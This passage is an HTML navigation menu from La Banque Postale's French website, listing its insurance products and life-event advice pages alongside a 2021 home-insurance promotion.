                                        <div class="m-header__submenu__title m-header__panel__title u-margin-2xl-left u-margin-none-xs u-margin-none-sm u-spacing-lg-bottom">
                                            <div>
                                                <button role="button" class="m-header__panel__back submenu hidden-md hidden-lg" data-level="2">
                                <svg class="a-icon--s" aria-hidden="true" focusable="false">
                                    <use xlink:href="https://www.labanquepostale.fr/etc.clientlibs/labanquepostale/commons/clientlibs/base/resources/svg-icons.svg#ic-interface-chevron-left"></use>
                                </svg>
                                <span class="sr-only-xs sr-only-sm u-hidden--all--md">Retour au menu principal</span>
                            </button>
                                                <p class="a-text--small lato-bold u-text-color--black">Assurer</p>
                                            </div>
                                            <p class="a-text--small hidden-sm hidden-xs">Assurance auto, habitation, santé, protection juridique, décès... La Banque Postale vous propose des solutions adaptées pour être bien protégé ainsi que vos proches.</p>
                                        </div>
                                        <div class="m-header__submenu__list__wrapper   u-spacing-2xl-left u-spacing-none-sm u-spacing-none-xs">
                                            <span class="submenu-v-line animation-line"></span>
                                            <ul class="m-header__submenu__list u-margin-2xl-right u-margin-none-sm u-margin-none-xs" id="submenu-0">

                                                <li class="a-navigation__submenu__item u-spacing-2xs-bottom u-spacing-2xs-top u-spacing-xs-bottom-sm u-spacing-xs-top-sm" data-level="2">
                                                    <span class="submenu-h-line animation-line"></span>

                                                    <button role="button" class="a-navigation__submenu__item__label a-text--small js-navigation-menu-target js-tracking-item" aria-expanded="false">Assurances véhicules</button>
                                                    <svg class="a-navigation__list__item__icon a-icon--xs" aria-hidden="true" focusable="false">
                <use xlink:href="https://www.labanquepostale.fr/etc.clientlibs/labanquepostale/commons/clientlibs/base/resources/svg-icons.svg#ic-interface-chevron-right"></use>
            </svg>
                                                    <div class="m-header__sublist__panel m-header__panel--mobile">
                                                        <div class="m-header__panel__title a-text--body hidden-md hidden-lg">
                                                            <div>
                                                                <button role="button" class="m-header__panel__back sublist" data-level="3">
                            <svg class="a-icon--s" aria-hidden="true" focusable="false">
                                <use xlink:href="https://www.labanquepostale.fr/etc.clientlibs/labanquepostale/commons/clientlibs/base/resources/svg-icons.svg#ic-interface-chevron-left"></use>
                            </svg>
                            <span class="sr-only-xs sr-only-sm u-hidden--all--md">Retour au menu Assurer</span>
                        </button>
                                                                <p class="a-text--small lato-bold u-text-color--black">Assurances véhicules</p>
                                                            </div>
                                                        </div>
                                                        <ul class="m-header__sublist u-spacing-none-xs u-spacing-none-sm u-spacing-2xl-left">

                                                            <li class="a-navigation__sublist__item" data-level="3">
                                                                <span class="a-navigation__sublist__item__label">
                <span class="sublist-h-line animation-line"></span>
                                                                <a href="/particulier/assurer/assurances-vehicules/assurance-auto.html" class="a-text--small js-tracking-item">Assurance Auto</a>
                                                                </span>
                                                            </li>

                                                            <li class="a-navigation__sublist__item" data-level="3">
                                                                <span class="a-navigation__sublist__item__label">
                <span class="sublist-h-line animation-line"></span>
                                                                <a href="/particulier/assurer/assurances-vehicules/assurance-2-roues.html" class="a-text--small js-tracking-item">Assurance 2 roues</a>
                                                                </span>
                                                            </li>

                                                            <li class="a-navigation__sublist__item" data-level="3" last-item="">
                                                                <span class="a-navigation__sublist__item__label">
                <span class="sublist-h-line animation-line"></span>
                                                                <a href="/particulier/assurer/assurances-vehicules/protection-juridique.html" class="a-text--small js-tracking-item">Protection Juridique</a>
                                                                </span>
                                                            </li>

                                                        </ul>
                                                    </div>
                                                </li>

                                                <li class="a-navigation__submenu__item u-spacing-2xs-bottom u-spacing-2xs-top u-spacing-xs-bottom-sm u-spacing-xs-top-sm" data-level="2">
                                                    <span class="submenu-h-line animation-line"></span>

                                                    <button role="button" class="a-navigation__submenu__item__label a-text--small js-navigation-menu-target js-tracking-item" aria-expanded="false">Assurances logement</button>
                                                    <svg class="a-navigation__list__item__icon a-icon--xs" aria-hidden="true" focusable="false">
                <use xlink:href="https://www.labanquepostale.fr/etc.clientlibs/labanquepostale/commons/clientlibs/base/resources/svg-icons.svg#ic-interface-chevron-right"></use>
            </svg>
                                                    <div class="m-header__sublist__panel m-header__panel--mobile">
                                                        <div class="m-header__panel__title a-text--body hidden-md hidden-lg">
                                                            <div>
                                                                <button role="button" class="m-header__panel__back sublist" data-level="3">
                            <svg class="a-icon--s" aria-hidden="true" focusable="false">
                                <use xlink:href="https://www.labanquepostale.fr/etc.clientlibs/labanquepostale/commons/clientlibs/base/resources/svg-icons.svg#ic-interface-chevron-left"></use>
                            </svg>
                            <span class="sr-only-xs sr-only-sm u-hidden--all--md">Retour au menu Assurer</span>
                        </button>
                                                                <p class="a-text--small lato-bold u-text-color--black">Assurances logement</p>
                                                            </div>
                                                        </div>
                                                        <ul class="m-header__sublist u-spacing-none-xs u-spacing-none-sm u-spacing-2xl-left">

                                                            <li class="a-navigation__sublist__item" data-level="3">
                                                                <span class="a-navigation__sublist__item__label">
                <span class="sublist-h-line animation-line"></span>
                                                                <a href="/particulier/assurer/assurances-logement/assurance-habitation.html" class="a-text--small js-tracking-item">Assurance habitation</a>
                                                                </span>
                                                            </li>

                                                            <li class="a-navigation__sublist__item" data-level="3">
                                                                <span class="a-navigation__sublist__item__label">
                <span class="sublist-h-line animation-line"></span>
                                                                <a href="/particulier/assurer/assurances-logement/assurance-habitation-special-jeunes.html" class="a-text--small js-tracking-item">Assurance habitation spéciale jeunes</a>
                                                                </span>
                                                            </li>

                                                            <li class="a-navigation__sublist__item" data-level="3" last-item="">
                                                                <span class="a-navigation__sublist__item__label">
                <span class="sublist-h-line animation-line"></span>
                                                                <a href="/particulier/assurer/assurances-logement/protection-juridique.html" class="a-text--small js-tracking-item">Protection Juridique</a>
                                                                </span>
                                                            </li>

                                                        </ul>
                                                    </div>
                                                </li>

                                                <li class="a-navigation__submenu__item u-spacing-2xs-bottom u-spacing-2xs-top u-spacing-xs-bottom-sm u-spacing-xs-top-sm" data-level="2">
                                                    <span class="submenu-h-line animation-line"></span>

                                                    <button role="button" class="a-navigation__submenu__item__label a-text--small js-navigation-menu-target js-tracking-item" aria-expanded="false">Assurances Santé</button>
                                                    <svg class="a-navigation__list__item__icon a-icon--xs" aria-hidden="true" focusable="false">
                <use xlink:href="https://www.labanquepostale.fr/etc.clientlibs/labanquepostale/commons/clientlibs/base/resources/svg-icons.svg#ic-interface-chevron-right"></use>
            </svg>
                                                    <div class="m-header__sublist__panel m-header__panel--mobile">
                                                        <div class="m-header__panel__title a-text--body hidden-md hidden-lg">
                                                            <div>
                                                                <button role="button" class="m-header__panel__back sublist" data-level="3">
                            <svg class="a-icon--s" aria-hidden="true" focusable="false">
                                <use xlink:href="https://www.labanquepostale.fr/etc.clientlibs/labanquepostale/commons/clientlibs/base/resources/svg-icons.svg#ic-interface-chevron-left"></use>
                            </svg>
                            <span class="sr-only-xs sr-only-sm u-hidden--all--md">Retour au menu Assurer</span>
                        </button>
                                                                <p class="a-text--small lato-bold u-text-color--black">Assurances Santé</p>
                                                            </div>
                                                        </div>
                                                        <ul class="m-header__sublist u-spacing-none-xs u-spacing-none-sm u-spacing-2xl-left">

                                                            <li class="a-navigation__sublist__item" data-level="3">
                                                                <span class="a-navigation__sublist__item__label">
                <span class="sublist-h-line animation-line"></span>
                                                                <a href="/particulier/assurer/assurances-sante/assurance-sante.html" class="a-text--small js-tracking-item">Assurance Santé</a>
                                                                </span>
                                                            </li>

                                                            <li class="a-navigation__sublist__item" data-level="3" last-item="">
                                                                <span class="a-navigation__sublist__item__label">
                <span class="sublist-h-line animation-line"></span>
                                                                <a href="/particulier/assurer/assurances-sante/assurance-coup-dur-sante.html" class="a-text--small js-tracking-item">Assurance Coups Durs Santé</a>
                                                                </span>
                                                            </li>

                                                        </ul>
                                                    </div>
                                                </li>

                                                <li class="a-navigation__submenu__item u-spacing-2xs-bottom u-spacing-2xs-top u-spacing-xs-bottom-sm u-spacing-xs-top-sm" data-level="2">
                                                    <span class="submenu-h-line animation-line"></span>

                                                    <button role="button" class="a-navigation__submenu__item__label a-text--small js-navigation-menu-target js-tracking-item" aria-expanded="false">Protection de la famille</button>
                                                    <svg class="a-navigation__list__item__icon a-icon--xs" aria-hidden="true" focusable="false">
                <use xlink:href="https://www.labanquepostale.fr/etc.clientlibs/labanquepostale/commons/clientlibs/base/resources/svg-icons.svg#ic-interface-chevron-right"></use>
            </svg>
                                                    <div class="m-header__sublist__panel m-header__panel--mobile">
                                                        <div class="m-header__panel__title a-text--body hidden-md hidden-lg">
                                                            <div>
                                                                <button role="button" class="m-header__panel__back sublist" data-level="3">
                            <svg class="a-icon--s" aria-hidden="true" focusable="false">
                                <use xlink:href="https://www.labanquepostale.fr/etc.clientlibs/labanquepostale/commons/clientlibs/base/resources/svg-icons.svg#ic-interface-chevron-left"></use>
                            </svg>
                            <span class="sr-only-xs sr-only-sm u-hidden--all--md">Retour au menu Assurer</span>
                        </button>
                                                                <p class="a-text--small lato-bold u-text-color--black">Protection de la famille</p>
                                                            </div>
                                                        </div>
                                                        <ul class="m-header__sublist u-spacing-none-xs u-spacing-none-sm u-spacing-2xl-left">

                                                            <li class="a-navigation__sublist__item" data-level="3">
                                                                <span class="a-navigation__sublist__item__label">
                <span class="sublist-h-line animation-line"></span>
                                                                <a href="/particulier/assurer/protection-de-la-famille/assurance-accident-de-la-vie.html" class="a-text--small js-tracking-item">Assurance des Accidents de la vie</a>
                                                                </span>
                                                            </li>

                                                            <li class="a-navigation__sublist__item" data-level="3" last-item="">
                                                                <span class="a-navigation__sublist__item__label">
                <span class="sublist-h-line animation-line"></span>
                                                                <a href="/particulier/assurer/protection-de-la-famille/assurance-deces-invalidite.html" class="a-text--small js-tracking-item">Assurance décès et invalidité</a>
                                                                </span>
                                                            </li>

                                                        </ul>
                                                    </div>
                                                </li>

                                                <li class="a-navigation__submenu__item u-spacing-2xs-bottom u-spacing-2xs-top u-spacing-xs-bottom-sm u-spacing-xs-top-sm" data-level="2" last-item="">
                                                    <span class="submenu-h-line animation-line"></span>

                                                    <button role="button" class="a-navigation__submenu__item__label a-text--small js-navigation-menu-target js-tracking-item" aria-expanded="false">Assurances au quotidien</button>
                                                    <svg class="a-navigation__list__item__icon a-icon--xs" aria-hidden="true" focusable="false">
                <use xlink:href="https://www.labanquepostale.fr/etc.clientlibs/labanquepostale/commons/clientlibs/base/resources/svg-icons.svg#ic-interface-chevron-right"></use>
            </svg>
                                                    <div class="m-header__sublist__panel m-header__panel--mobile">
                                                        <div class="m-header__panel__title a-text--body hidden-md hidden-lg">
                                                            <div>
                                                                <button role="button" class="m-header__panel__back sublist" data-level="3">
                            <svg class="a-icon--s" aria-hidden="true" focusable="false">
                                <use xlink:href="https://www.labanquepostale.fr/etc.clientlibs/labanquepostale/commons/clientlibs/base/resources/svg-icons.svg#ic-interface-chevron-left"></use>
                            </svg>
                            <span class="sr-only-xs sr-only-sm u-hidden--all--md">Retour au menu Assurer</span>
                        </button>
                                                                <p class="a-text--small lato-bold u-text-color--black">Assurances au quotidien</p>
                                                            </div>
                                                        </div>
                                                        <ul class="m-header__sublist u-spacing-none-xs u-spacing-none-sm u-spacing-2xl-left">

                                                            <li class="a-navigation__sublist__item" data-level="3">
                                                                <span class="a-navigation__sublist__item__label">
                <span class="sublist-h-line animation-line"></span>
                                                                <a href="/particulier/assurer/assurances-au-quotidien/protection-juridique.html" class="a-text--small js-tracking-item">Protection juridique</a>
                                                                </span>
                                                            </li>

                                                            <li class="a-navigation__sublist__item" data-level="3">
                                                                <span class="a-navigation__sublist__item__label">
                <span class="sublist-h-line animation-line"></span>
                                                                <a href="/particulier/assurer/assurances-au-quotidien/assurance-moyens-de-paiement-allyatis.html" class="a-text--small js-tracking-item">Assurance Moyens de paiements</a>
                                                                </span>
                                                            </li>

                                                            <li class="a-navigation__sublist__item" data-level="3">
                                                                <span class="a-navigation__sublist__item__label">
                <span class="sublist-h-line animation-line"></span>
                                                                <a href="/particulier/assurer/assurances-au-quotidien/assurance-appareils-nomades.html" class="a-text--small js-tracking-item">Assurance des Appareils nomades </a>
                                                                </span>
                                                            </li>

                                                            <li class="a-navigation__sublist__item" data-level="3" last-item="">
                                                                <span class="a-navigation__sublist__item__label">
                <span class="sublist-h-line animation-line"></span>
                                                                <a href="/particulier/assurer/assurances-au-quotidien/assurance-extension-de-garantie.html" class="a-text--small js-tracking-item">Assurance Extension de garantie</a>
                                                                </span>
                                                            </li>

                                                        </ul>
                                                    </div>
                                                </li>

                                            </ul>
                                        </div>

                                        <div class="m-header__submenu__push">
                                            <div class="m-header__submenu__push__wrapper">

                                                <div>

                                                    <div class="aem-Grid aem-Grid--12 aem-Grid--default--12 ">

                                                        <div class="title aem-GridColumn aem-GridColumn--default--12">

                                                            <div data-footnotes="true" class="m-title u-spacing-s-bottom  color-override u-color--green u-align-center">
                                                                <svg viewBox="0 0 24 24" class="a-icon--m u-spacing-3xs-right">
        <use xlink:href="https://www.labanquepostale.fr/etc.clientlibs/labanquepostale/commons/clientlibs/base/resources/svg-icons.svg#ic-products-domains-insurance_shield"></use>
    </svg>

                                                                <h4> Assurance habitation</h4>
                                                            </div>
                                                            <div class="js-footnotes-trigger u-hidden--all">
                                                                <ul class="js-footnotes--list">

                                                                </ul>
                                                            </div>
                                                        </div>
                                                        <div class="a-text aem-GridColumn aem-GridColumn--default--12">
                                                            <article class=" u-spacing-s-bottom" data-component-id="labanquepostale/sitepublic/components/edito/text" data-footnotes="true">

                                                                <p style="text-align: center;"><span class="a-text--emphasis"><span class="u-text-color--blue">Profitez de 2 mois offerts<sup>(1)</sup></span></span><br> pour toute nouvelle souscription d'un contrat Assurance Habitation du 1er septembre au 30 novembre 2021 inclus.</p>

                                                            </article>
                                                            <div class="js-footnotes-trigger u-hidden--all">
                                                                <ul class="js-footnotes--list">

                                                                </ul>
                                                            </div>
                                                        </div>
                                                        <div class="button aem-GridColumn aem-GridColumn--default--12">

                                                            <div class="m-button u-align-center u-spacing-2xl-bottom" data-component-id="labanquepostale/sitepublic/components/edito/button">
                                                                <a href="https://www.labanquepostale.fr/particulier/assurer/assurances-logement/assurance-habitation.html#xtor=CS4-7916-[espace_public]-[Offre_MRH]-[menu_assurer]-[https://www.labanquepostale.fr/particulier/assurer/assurances-logement/assurance-habitation.html]" class="u-btn m-button--content m-button--primary" data-internal="false" js-btn-tracking="">

                                                                    <span>
            En savoir plus
            
        </span>

                                                                </a>
                                                            </div>

                                                        </div>
                                                        <div class="image aem-GridColumn aem-GridColumn--default--12">

                                                            <div class=" u-spacing-2xl-bottom m-image">

                                                                <picture>

                                                                    <source media="(min-width: px)" srcset="https://www.labanquepostale.fr/content/dam/lbp/images/homepage/LBP-famille-teletravail.jpg/jcr:content/renditions/cq5dam.web.1080.1080.jpg , https://www.labanquepostale.fr/content/dam/lbp/images/homepage/LBP-famille-teletravail.jpg/jcr:content/renditions/cq5dam.web.3000.3000.jpg 2x">

                                                                    <source media="(min-width: px)" srcset="https://www.labanquepostale.fr/content/dam/lbp/images/homepage/LBP-famille-teletravail.jpg/jcr:content/renditions/cq5dam.web.375.375.jpg , https://www.labanquepostale.fr/content/dam/lbp/images/homepage/LBP-famille-teletravail.jpg/jcr:content/renditions/cq5dam.web.750.750.jpg 2x">

                                                                    <img src="https://www.labanquepostale.fr/content/dam/lbp/images/homepage/LBP-famille-teletravail.jpg/_jcr_content/renditions/cq5dam.web.3000.3000.jpg" width="3000px" height="2001px" class="  a-image--responsive" alt="" loading="lazy">

                                                                </picture>

                                                            </div>
                                                        </div>

                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </li>

                            <li class="a-navigation__list__item a-navigation__menu__item u-margin-none-xs u-margin-none-sm u-spacing-s-sm" menu-index="0" data-level="1">

                                <button role="button" class="a-navigation__menu__item__label a-text--small js-navigation-menu-target js-tracking-item" aria-expanded="false">Accompagner</button>
                                <svg class="a-navigation__list__item__icon a-icon--xs" aria-hidden="true" focusable="false">
                <use xlink:href="https://www.labanquepostale.fr/etc.clientlibs/labanquepostale/commons/clientlibs/base/resources/svg-icons.svg#ic-interface-chevron-right"></use>
            </svg>
                                <span class="line--wrapper--vertical"></span>
                                <div class="m-header__submenu m-header__panel--mobile">
                                    <div class="m-header__submenu__wrapper">
                                        <div class="m-header__submenu__title m-header__panel__title u-margin-2xl-left u-margin-none-xs u-margin-none-sm u-spacing-lg-bottom">
                                            <div>
                                                <button role="button" class="m-header__panel__back submenu hidden-md hidden-lg" data-level="2">
                                <svg class="a-icon--s" aria-hidden="true" focusable="false">
                                    <use xlink:href="https://www.labanquepostale.fr/etc.clientlibs/labanquepostale/commons/clientlibs/base/resources/svg-icons.svg#ic-interface-chevron-left"></use>
                                </svg>
                                <span class="sr-only-xs sr-only-sm u-hidden--all--md">Retour au menu principal</span>
                            </button>
                                                <p class="a-text--small lato-bold u-text-color--black">Accompagner</p>
                                            </div>
                                            <p class="a-text--small hidden-sm hidden-xs"></p>
                                        </div>
                                        <div class="m-header__submenu__list__wrapper w100--sm  u-spacing-2xl-left u-spacing-none-sm u-spacing-none-xs">
                                            <span class="submenu-v-line animation-line"></span>
                                            <ul class="m-header__submenu__list u-margin-2xl-right u-margin-none-sm u-margin-none-xs" id="submenu-0">

                                                <li class="a-navigation__submenu__item u-spacing-2xs-bottom u-spacing-2xs-top u-spacing-xs-bottom-sm u-spacing-xs-top-sm" data-level="2">
                                                    <span class="submenu-h-line animation-line"></span>

                                                    <button role="button" class="a-navigation__submenu__item__label a-text--small js-navigation-menu-target js-tracking-item" aria-expanded="false">Nos conseils en investissements immobiliers</button>
                                                    <svg class="a-navigation__list__item__icon a-icon--xs" aria-hidden="true" focusable="false">
                <use xlink:href="https://www.labanquepostale.fr/etc.clientlibs/labanquepostale/commons/clientlibs/base/resources/svg-icons.svg#ic-interface-chevron-right"></use>
            </svg>
                                                    <div class="m-header__sublist__panel m-header__panel--mobile">
                                                        <div class="m-header__panel__title a-text--body hidden-md hidden-lg">
                                                            <div>
                                                                <button role="button" class="m-header__panel__back sublist" data-level="3">
                            <svg class="a-icon--s" aria-hidden="true" focusable="false">
                                <use xlink:href="https://www.labanquepostale.fr/etc.clientlibs/labanquepostale/commons/clientlibs/base/resources/svg-icons.svg#ic-interface-chevron-left"></use>
                            </svg>
                            <span class="sr-only-xs sr-only-sm u-hidden--all--md">Retour au menu Accompagner</span>
                        </button>
                                                                <p class="a-text--small lato-bold u-text-color--black">Nos conseils en investissements immobiliers</p>
                                                            </div>
                                                        </div>
                                                        <ul class="m-header__sublist u-spacing-none-xs u-spacing-none-sm u-spacing-2xl-left">

                                                            <li class="a-navigation__sublist__item" data-level="3">
                                                                <span class="a-navigation__sublist__item__label">
                <span class="sublist-h-line animation-line"></span>
                                                                <a href="/particulier/accompagner/logement/premier-achat--immo.html" class="a-text--small js-tracking-item">Premier achat immobilier </a>
                                                                </span>
                                                            </li>

                                                            <li class="a-navigation__sublist__item" data-level="3">
                                                                <span class="a-navigation__sublist__item__label">
                <span class="sublist-h-line animation-line"></span>
                                                                <a href="/particulier/accompagner/logement/renovation-et-travaux.html" class="a-text--small js-tracking-item">Je rénove ou je fais des travaux dans mon logement </a>
                                                                </span>
                                                            </li>

                                                            <li class="a-navigation__sublist__item" data-level="3">
                                                                <span class="a-navigation__sublist__item__label">
                <span class="sublist-h-line animation-line"></span>
                                                                <a href="/particulier/accompagner/logement/achat-residence-secondaire.html" class="a-text--small js-tracking-item">Acheter ma résidence secondaire</a>
                                                                </span>
                                                            </li>

                                                            <li class="a-navigation__sublist__item" data-level="3">
                                                                <span class="a-navigation__sublist__item__label">
                <span class="sublist-h-line animation-line"></span>
                                                                <a href="/particulier/accompagner/logement/achat-avant-revente.html" class="a-text--small js-tracking-item">J’achète une nouvelle résidence principale avant d’avoir revendu l’actuelle </a>
                                                                </span>
                                                            </li>

                                                            <li class="a-navigation__sublist__item" data-level="3" last-item="">
                                                                <span class="a-navigation__sublist__item__label">
                <span class="sublist-h-line animation-line"></span>
                                                                <a href="/particulier/accompagner/logement/investissement-locatif.html" class="a-text--small js-tracking-item">Je souhaite investir dans le locatif </a>
                                                                </span>
                                                            </li>

                                                        </ul>
                                                    </div>
                                                </li>

                                                <li class="a-navigation__submenu__item u-spacing-2xs-bottom u-spacing-2xs-top u-spacing-xs-bottom-sm u-spacing-xs-top-sm" data-level="2">
                                                    <span class="submenu-h-line animation-line"></span>
                                                    <a href="/particulier/accompagner/voiture.html" class="a-navigation__submenu__item__label a-text--small js-tracking-item">Nos conseils pour l'achat d'une voiture</a>

                                                    <div class="m-header__sublist__panel m-header__panel--mobile">
                                                        <div class="m-header__panel__title a-text--body hidden-md hidden-lg">
                                                            <div>
                                                                <button role="button" class="m-header__panel__back sublist" data-level="3">
                            <svg class="a-icon--s" aria-hidden="true" focusable="false">
                                <use xlink:href="https://www.labanquepostale.fr/etc.clientlibs/labanquepostale/commons/clientlibs/base/resources/svg-icons.svg#ic-interface-chevron-left"></use>
                            </svg>
                            <span class="sr-only-xs sr-only-sm u-hidden--all--md">Retour au menu Accompagner</span>
                        </button>
                                                                <p class="a-text--small lato-bold u-text-color--black">Nos conseils pour l'achat d'une voiture</p>
                                                            </div>
                                                        </div>

                                                    </div>
                                                </li>

                                                <li class="a-navigation__submenu__item u-spacing-2xs-bottom u-spacing-2xs-top u-spacing-xs-bottom-sm u-spacing-xs-top-sm" data-level="2">
                                                    <span class="submenu-h-line animation-line"></span>

                                                    <button role="button" class="a-navigation__submenu__item__label a-text--small js-navigation-menu-target js-tracking-item" aria-expanded="false">Préparer l'avenir</button>
                                                    <svg class="a-navigation__list__item__icon a-icon--xs" aria-hidden="true" focusable="false">
                <use xlink:href="https://www.labanquepostale.fr/etc.clientlibs/labanquepostale/commons/clientlibs/base/resources/svg-icons.svg#ic-interface-chevron-right"></use>
            </svg>
                                                    <div class="m-header__sublist__panel m-header__panel--mobile">
                                                        <div class="m-header__panel__title a-text--body hidden-md hidden-lg">
                                                            <div>
                                                                <button role="button" class="m-header__panel__back sublist" data-level="3">
                            <svg class="a-icon--s" aria-hidden="true" focusable="false">
                                <use xlink:href="https://www.labanquepostale.fr/etc.clientlibs/labanquepostale/commons/clientlibs/base/resources/svg-icons.svg#ic-interface-chevron-left"></use>
                            </svg>
                            <span class="sr-only-xs sr-only-sm u-hidden--all--md">Retour au menu Accompagner</span>
                        </button>
                                                                <p class="a-text--small lato-bold u-text-color--black">Préparer l'avenir</p>
                                                            </div>
                                                        </div>
                                                        <ul class="m-header__sublist u-spacing-none-xs u-spacing-none-sm u-spacing-2xl-left">

                                                            <li class="a-navigation__sublist__item" data-level="3">
                                                                <span class="a-navigation__sublist__item__label">
                <span class="sublist-h-line animation-line"></span>
                                                                <a href="/particulier/accompagner/avenir/premiere-epargne.html" class="a-text--small js-tracking-item">Quatre pistes pour bien débuter votre vie d’épargnant</a>
                                                                </span>
                                                            </li>

                                                            <li class="a-navigation__sublist__item" data-level="3">
                                                                <span class="a-navigation__sublist__item__label">
                <span class="sublist-h-line animation-line"></span>
                                                                <a href="/particulier/accompagner/avenir/developpement-du-patrimoine.html" class="a-text--small js-tracking-item">Développer son patrimoine : cap sur la diversification </a>
                                                                </span>
                                                            </li>

                                                            <li class="a-navigation__sublist__item" data-level="3">
                                                                <span class="a-navigation__sublist__item__label">
                <span class="sublist-h-line animation-line"></span>
                                                                <a href="/particulier/accompagner/avenir/strategie-patrimoniale-par-objectifs.html" class="a-text--small js-tracking-item">Adapter son patrimoine à ses priorités</a>
                                                                </span>
                                                            </li>

                                                            <li class="a-navigation__sublist__item" data-level="3" last-item="">
                                                                <span class="a-navigation__sublist__item__label">
                <span class="sublist-h-line animation-line"></span>
                                                                <a href="/particulier/accompagner/avenir/retraite.html" class="a-text--small js-tracking-item">Préparer sa retraite</a>
                                                                </span>
                                                            </li>

                                                        </ul>
                                                    </div>
                                                </li>

                                                <li class="a-navigation__submenu__item u-spacing-2xs-bottom u-spacing-2xs-top u-spacing-xs-bottom-sm u-spacing-xs-top-sm" data-level="2">
                                                    <span class="submenu-h-line animation-line"></span>

                                                    <button role="button" class="a-navigation__submenu__item__label a-text--small js-navigation-menu-target js-tracking-item" aria-expanded="false">Nos conseils pour faire face aux aléas de la vie</button>
                                                    <svg class="a-navigation__list__item__icon a-icon--xs" aria-hidden="true" focusable="false">
                <use xlink:href="https://www.labanquepostale.fr/etc.clientlibs/labanquepostale/commons/clientlibs/base/resources/svg-icons.svg#ic-interface-chevron-right"></use>
            </svg>
                                                    <div class="m-header__sublist__panel m-header__panel--mobile">
                                                        <div class="m-header__panel__title a-text--body hidden-md hidden-lg">
                                                            <div>
                                                                <button role="button" class="m-header__panel__back sublist" data-level="3">
                            <svg class="a-icon--s" aria-hidden="true" focusable="false">
                                <use xlink:href="https://www.labanquepostale.fr/etc.clientlibs/labanquepostale/commons/clientlibs/base/resources/svg-icons.svg#ic-interface-chevron-left"></use>
                            </svg>
                            <span class="sr-only-xs sr-only-sm u-hidden--all--md">Retour au menu Accompagner</span>
                        </button>
                                                                <p class="a-text--small lato-bold u-text-color--black">Nos conseils pour faire face aux aléas de la vie</p>
                                                            </div>
                                                        </div>
                                                        <ul class="m-header__sublist u-spacing-none-xs u-spacing-none-sm u-spacing-2xl-left">

                                                            <li class="a-navigation__sublist__item" data-level="3">
                                                                <span class="a-navigation__sublist__item__label">
                <span class="sublist-h-line animation-line"></span>
                                                                <a href="/particulier/accompagner/soucis/perte-proche.html" class="a-text--small js-tracking-item">Perte d'un proche</a>
                                                                </span>
                                                            </li>

                                                            <li class="a-navigation__sublist__item" data-level="3">
                                                                <span class="a-navigation__sublist__item__label">
                <span class="sublist-h-line animation-line"></span>
                                                                <a href="/particulier/accompagner/soucis/perte-emploi.html" class="a-text--small js-tracking-item">Surmonter la perte de son emploi</a>
                                                                </span>
                                                            </li>

                                                            <li class="a-navigation__sublist__item" data-level="3" last-item="">
                                                                <span class="a-navigation__sublist__item__label">
                <span class="sublist-h-line animation-line"></span>
                                                                <a href="/particulier/accompagner/soucis/separation.html" class="a-text--small js-tracking-item">Gérer une séparation ou un divorce</a>
                                                                </span>
                                                            </li>

                                                        </ul>
                                                    </div>
                                                </li>

                                                <li class="a-navigation__submenu__item u-spacing-2xs-bottom u-spacing-2xs-top u-spacing-xs-bottom-sm u-spacing-xs-top-sm" data-level="2">
                                                    <span class="submenu-h-line animation-line"></span>
                                                    <a href="/particulier/accompagner/assistance-a-un-majeur-protege.html" class="a-navigation__submenu__item__label a-text--small js-tracking-item">Accompagner une personne protégée</a>

                                                    <div class="m-header__sublist__panel m-header__panel--mobile">
                                                        <div class="m-header__panel__title a-text--body hidden-md hidden-lg">
                                                            <div>
                                                                <button role="button" class="m-header__panel__back sublist" data-level="3">
                            <svg class="a-icon--s" aria-hidden="true" focusable="false">
                                <use xlink:href="https://www.labanquepostale.fr/etc.clientlibs/labanquepostale/commons/clientlibs/base/resources/svg-icons.svg#ic-interface-chevron-left"></use>
                            </svg>
                            <span class="sr-only-xs sr-only-sm u-hidden--all--md">Retour au menu Accompagner</span>
                        </button>
                                                                <p class="a-text--small lato-bold u-text-color--black">Accompagner une personne protégée</p>
                                                            </div>
                                                        </div>

                                                    </div>
                                                </li>

                                                <li class="a-navigation__submenu__item u-spacing-2xs-bottom u-spacing-2xs-top u-spacing-xs-bottom-sm u-spacing-xs-top-sm" data-level="2">
                                                    <span class="submenu-h-line animation-line"></span>

                                                    <button role="button" class="a-navigation__submenu__item__label a-text--small js-navigation-menu-target js-tracking-item" aria-expanded="false">Assistance à un proche</button>
                                                    <svg class="a-navigation__list__item__icon a-icon--xs" aria-hidden="true" focusable="false">
                <use xlink:href="https://www.labanquepostale.fr/etc.clientlibs/labanquepostale/commons/clientlibs/base/resources/svg-icons.svg#ic-interface-chevron-right"></use>
            </svg>
                                                    <div class="m-header__sublist__panel m-header__panel--mobile">
                                                        <div class="m-header__panel__title a-text--body hidden-md hidden-lg">
                                                            <div>
                                                                <button role="button" class="m-header__panel__back sublist" data-level="3">
                            <svg class="a-icon--s" aria-hidden="true" focusable="false">
                                <use xlink:href="https://www.labanquepostale.fr/etc.clientlibs/labanquepostale/commons/clientlibs/base/resources/svg-icons.svg#ic-interface-chevron-left"></use>
                            </svg>
                            <span class="sr-only-xs sr-only-sm u-hidden--all--md">Retour au menu Accompagner</span>
                        </button>
                                                                <p class="a-text--small lato-bold u-text-color--black">Assistance à un proche</p>
                                                            </div>
                                                        </div>
                                                        <ul class="m-header__sublist u-spacing-none-xs u-spacing-none-sm u-spacing-2xl-left">

                                                            <li class="a-navigation__sublist__item" data-level="3">
                                                                <span class="a-navigation__sublist__item__label">
                <span class="sublist-h-line animation-line"></span>
                                                                <a href="/particulier/accompagner/assistance-a-un-proche/droits-devoir-formation.html" class="a-text--small js-tracking-item">Être ou devenir aidant </a>
                                                                </span>
                                                            </li>

                                                            <li class="a-navigation__sublist__item" data-level="3">
                                                                <span class="a-navigation__sublist__item__label">
                <span class="sublist-h-line animation-line"></span>
                                                                <a href="/particulier/accompagner/assistance-a-un-proche/personne-situation-handicap.html" class="a-text--small js-tracking-item">Accompagner une personne en situation de handicap</a>
                                                                </span>
                                                            </li>

                                                            <li class="a-navigation__sublist__item" data-level="3" last-item="">
                                                                <span class="a-navigation__sublist__item__label">
                <span class="sublist-h-line animation-line"></span>
                                                                <a href="/particulier/accompagner/assistance-a-un-proche/personnes-agees.html" class="a-text--small js-tracking-item">Accompagner une personne en situation de vieillissement</a>
                                                                </span>
                                                            </li>

                                                        </ul>
                                                    </div>
                                                </li>

                                                <li class="a-navigation__submenu__item u-spacing-2xs-bottom u-spacing-2xs-top u-spacing-xs-bottom-sm u-spacing-xs-top-sm" data-level="2">
                                                    <span class="submenu-h-line animation-line"></span>
